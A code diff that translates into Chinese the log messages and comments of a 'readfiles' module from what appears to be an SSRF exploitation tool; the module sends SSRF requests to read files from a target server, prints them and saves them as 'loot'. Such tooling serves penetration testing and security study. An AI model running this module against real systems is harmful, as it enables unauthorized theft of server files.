@@ -3,14 +3,14 @@ import logging
 from core.utils import *
 
 name = "readfiles"
-description = "Read files from the target"
+description = "读取目标上的文件"
 author = "Swissky"
 documentation = []
 
 
 class exploit:
     def __init__(self, requester, args):
-        logging.info(f"Module '{name}' launched !")
+        logging.info(f"模块 '{name}' 已启动！")
         if hasattr(args, "targetfiles") and isinstance(args.targetfiles, str):
             self.files = args.targetfiles.split(",")
         else:
@@ -38,17 +38,17 @@ class exploit:
                 r = requester.do_request(args.param, wrapper_file(remote_file))
                 diff = diff_text(r.text, default)
                 if diff != "":
-                    # Display diff between default and ssrf request
-                    logging.info(f"\033[32mReading file\033[0m : {remote_file}")
+                    # 显示默认请求与 SSRF 请求之间的差异
+                    logging.info(f"\033[32m读取文件\033[0m : {remote_file}")
                     if bytes(diff, encoding="utf-8").startswith(self.file_magic["elf"]):
-                        logging.info("ELF binary found - not printing to stdout")
+                        logging.info("发现 ELF 二进制文件 - 不输出到终端")
                     else:
                         logging.info(diff)
 
-                    # Write diff to a file
+                    # 将差异写入文件
                     output_path = loot_path(requester.host, remote_file)
-                    logging.info(f"\033[32mWriting file\033[0m : {remote_file} to {output_path}")
+                    logging.info(f"\033[32m写入文件\033[0m : {remote_file} 到 {output_path}")
                     output_path.write_text(diff, encoding="utf-8")
 
         else:
-            logging.info("Empty response")
+            logging.info("响应为空")
